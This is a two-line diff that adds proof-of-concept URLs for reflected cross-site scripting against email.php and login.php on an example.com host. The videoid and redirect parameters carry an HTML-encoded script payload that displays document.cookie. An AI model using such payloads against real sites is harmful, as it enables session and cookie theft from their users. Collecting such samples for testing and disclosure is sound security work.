@@ -1,0 +1,2 @@
+http://www.example.com/tools/email.php?videoid=&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;
+http://www.example.com/tools/login.php?redirect=&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;
